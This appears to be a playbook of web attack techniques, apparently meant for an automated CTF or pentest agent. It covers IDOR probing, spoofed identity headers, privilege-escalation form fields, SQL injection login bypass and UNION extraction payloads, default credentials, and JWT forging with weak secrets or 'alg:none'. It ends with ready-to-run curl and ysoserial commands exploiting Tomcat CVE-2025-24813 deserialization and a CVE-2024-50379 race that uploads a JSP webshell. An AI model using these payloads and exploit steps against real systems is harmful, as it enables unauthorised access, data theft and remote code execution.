title: URL Path IDOR — Direct Object Reference in URL
description: When URLs contain numeric IDs (/order/123, /user/456), try adjacent values to access other users' data.
techniques: Increment/decrement numeric path segments by ±1, ±10
Try common IDs: 0, 1, 2, admin user IDs
Check if authentication is checked per-resource
If data returned differs, you found IDOR
indicators: Same endpoint returns different data for different IDs

title: Header-Based IDOR — Custom Auth Headers
description: Applications may trust custom HTTP headers (X-UserId, X-Auth-User, X-Forwarded-User) to identify users. Set these headers to different user IDs to access other users' data.
techniques: Try headers: X-UserId, X-User-Id, X-Forwarded-User, X-Auth-User, X-Authenticated-User
Try the header on every authenticated page
If response changes (different user data or status code), you found IDOR
indicators: JavaScript sending X-UserId in fetch requests

title: POST Body IDOR — Privilege Escalation via Form Fields
description: Profile edit forms may accept privilege escalation fields (is_admin, role, user_id) that the attacker can tamper with. POST to edit endpoints with these fields set to elevated values.
techniques: On profile/edit pages: POST with is_admin=1, admin=true, role=admin
Change user_id in POST body to another user's ID
Try adding fields: is_admin, admin, role, permissions, groups
After state change, revisit data pages to check for new access
indicators: Admin status indicators in page content

title: SQL Injection — Authentication Bypass
description: Login forms that concatenate user input into SQL queries can be bypassed. Try classic SQLi payloads in username/password fields.
techniques: Username: ' OR '1'='1, admin'--, ' OR 1=1--
Username: ' UNION SELECT 1,'admin','password'--
If SQL error returned, parametrize further
Use sqlmap if available: sqlmap -u URL --data='username=*&password=*'
indicators: Numeric user IDs suggesting DB backend

title: SQL Injection — UNION-Based Data Extraction
description: Use UNION SELECT to extract data from other database tables when the query result is displayed on the page.
techniques: Determine column count: ' ORDER BY 1--, ORDER BY 2--, ...
Find visible columns: ' UNION SELECT 1,2,3,4,5--
Extract data: ' UNION SELECT username,password,3,4,5 FROM users--
Use sqlmap with --technique=U for automated UNION exploitation

title: Default Credentials
description: Many applications ship with default test accounts. Try common credential pairs on every login form discovered.
techniques: Try: test/test, admin/admin, admin/password, demo/demo, guest/guest, root/root
Check HTML comments for hints: <!-- TODO: delete test account -->
Look for hardcoded credentials in JavaScript or page source
After login, immediately check all authenticated pages for sensitive data

title: JWT Token Manipulation
description: Applications using JWT for authentication may be vulnerable to token manipulation, especially with weak secrets. Try decoding, modifying, and replaying JWTs.
techniques: Decode JWT with jwt.io or Python jose library
Check if 'alg':'none' is accepted (no signature)
Try weak secrets: 'secret', 'your_secret_key', 'password'
Modify 'sub' claim to another user's ID
Check token expiration — may be infinite
Send modified JWT in Authorization: Bearer or Cookie header
indicators: JWT in cookie or Authorization header

title: API Discovery via Swagger/OpenAPI
description: FastAPI and other frameworks auto-generate API documentation at /docs or /openapi.json. This reveals ALL endpoints, parameters, and request formats.
techniques: Fetch /openapi.json, /docs, /swagger.json, /api/docs
Parse paths and methods from the OpenAPI spec
Try every discovered endpoint with authentication
Look for {id} parameters in paths — IDOR targets
Look for POST endpoints with interesting field names (is_admin, role)

title: JWT Signature Forging with Weak Secret
description: JWTs with weak secrets can be forged. FastAPI apps often use 'your_secret_key' or 'secret' as the signing key. Forge a JWT with a different sub claim to access other users' data.
techniques: Decode existing JWT to extract algorithm and claims
Try common weak secrets: 'your_secret_key', 'secret', 'SECRET_KEY', 'changeme'
Use Python jose library to forge token with modified 'sub'
Send forged token in Cookie: access_token=Bearer <forged_jwt>
Access /company/{id}/jobs or similar endpoints with forged token
indicators: Hardcoded SECRET_KEY in source if visible

title: Apache Tomcat Deserialization RCE — PUT Partial Session Exploit (CVE-2025-24813)
description: Tomcat 9.0.x with read-only JMX disabled (default) allows PUT requests to store serialized session files via PersistentManager FileStore. Attack: (1) Probe Tomcat version: curl -s TARGET:PORT/ | grep -i tomcat — look for 9.0.98. (2) Check for read-only disabled by testing PUT: curl -X PUT TARGET:PORT/test.txt -d 'test'. (3) Create ysoserial payload for commons-collections-3.2.1: java -jar ysoserial.jar CommonsCollections6 'cat /opt/flag.txt > /tmp/out' > payload.ser. (4) Send partial PUT to store session file: curl -X PUT TARGET:PORT/session -H 'Content-Range: bytes 0-1000/1001' --data-binary @payload.ser. (5) Trigger deserialization by accessing session: curl TARGET:PORT/ -H 'Cookie: JSESSIONID=.XXXXX'. (6) Read command output: curl TARGET:PORT/cmd?c=cat+/opt/flag.txt.
techniques: Probe: curl -s TARGET:PORT/ | grep -i tomcat
Test PUT: curl -X PUT TARGET:PORT/test.txt -d 'test'
Generate payload: java -jar ysoserial.jar CommonsCollections6 'CMD' > payload.ser
Partial PUT: curl -X PUT TARGET:PORT/session -H 'Content-Range: bytes 0-1000/1001' --data-binary @payload.ser
Trigger: curl TARGET:PORT/ -H 'Cookie: JSESSIONID=.XXXXX'
Read output: curl TARGET:PORT/cmd?c=cat+/opt/flag.txt

title: Apache Tomcat Race Condition RCE — JSP Upload Concurrent Compilation (CVE-2024-50379)
description: Tomcat 9.0.97 has a race condition where PUT validation and JSP compilation happen concurrently. Attack: (1) Probe Tomcat version — look for 9.0.97. (2) Send concurrent PUT requests: upload a .jsp webshell while simultaneously requesting it before validation completes. (3) Use shell to read flag file. (4) The race window is small — send 50-100 concurrent requests.
techniques: Probe: curl -s TARGET:PORT/ | grep -i tomcat
Race exploit: for i in $(seq 1 100); do curl -X PUT TARGET:PORT/shell.jsp -d '<% Runtime.getRuntime().exec("cat /opt/flag.txt") %>' & curl TARGET:PORT/shell.jsp & done; wait
Create JSP webshell file and upload with concurrent GET requests during PUT
